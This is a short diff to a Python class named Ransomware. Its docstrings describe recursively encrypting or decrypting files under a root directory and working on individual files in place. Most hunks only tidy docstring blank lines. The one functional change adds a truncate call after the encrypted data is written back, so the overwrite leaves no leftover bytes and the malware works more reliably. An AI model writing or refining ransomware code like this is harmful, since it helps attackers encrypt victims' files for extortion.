@@ -34,7 +34,6 @@ class Ransomware:
     def read_key(self, keyfile_name):
         """
         Reads in a key from a file.
-
         Args:
             keyfile_name:str: Path to the file containing the key
         """
@@ -57,7 +56,6 @@ class Ransomware:
     def crypt_root(self, root_dir, encrypted=False):
         """
         Recursively encrypts or decrypts files from root directory with allowed file extensions
-
         Args:
             root_dir:str: Absolute path of top level directory
             encrypt:bool: Specify whether to encrypt or decrypt encountered files
@@ -79,7 +77,6 @@ class Ransomware:
     def crypt_file(self, file_path, encrypted=False):
         """
         Encrypts or decrypts a file
-
         Args:
             file_path:str: Absolute path to a file 
         """
@@ -97,6 +94,7 @@ class Ransomware:
 
             f.seek(0)
             f.write(data)
+            f.truncate()
 
 
 if __name__ == '__main__':
